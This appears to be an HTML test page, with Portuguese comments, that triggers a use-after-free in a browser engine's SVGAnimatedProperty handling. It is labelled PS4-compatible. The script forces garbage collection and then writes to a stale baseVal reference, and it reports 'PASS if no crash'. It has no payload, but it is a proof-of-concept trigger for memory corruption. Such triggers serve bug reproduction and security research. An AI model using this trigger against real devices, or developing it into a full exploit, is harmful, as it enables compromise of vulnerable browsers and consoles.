
<!DOCTYPE html>
<html>
<body>
<h2>Teste SVGAnimatedProperty UAF (PS4 Compatible)</h2>
<div id="result">Executando...</div>

<script>
    function gc() {
    if (typeof GCController !== "undefined")
        GCController.collect();
    else {
        var gcRec = function (n) {
            if (n < 1)
                return {};
            var temp = {i: "ab" + i + (i / 100000)};
            temp += "foo";
            gcRec(n-1);
        };
        for (var i = 0; i < 1000; i++)
            gcRec(10);
    }
    }
onload = async () => {
    try {
        // Cria os elementos SVG suportados no motor legado
        let svg0 = document.createElementNS('http://www.w3.org/2000/svg', 'svg');
        let svgAnimatedLength = svg0.width;
        let baseVal = svgAnimatedLength.baseVal;
        
        let clipPath0 = document.createElementNS('http://www.w3.org/2000/svg', 'clipPath');
        svg0.append(clipPath0);
        clipPath0.append('');
        
        // Pequena pausa assíncrona para o motor processar a árvore DOM
        await new Promise(resolve => setTimeout(resolve, 50));

        // Tenta acionar a coleta de lixo
        
            gc();

        // Altera a propriedade baseVal para disparar o commitPropertyChange
        baseVal.value = 0;

        document.getElementById('result').innerHTML = '<span style="color: green; font-weight: bold;">PASS if no crash</span>';
    } catch (e) {
        document.getElementById('result').innerHTML = '<span style="color: red; font-weight: bold;">ERRO: ' + e.message + '</span>';
    }
};
</script>
</body>
</html>
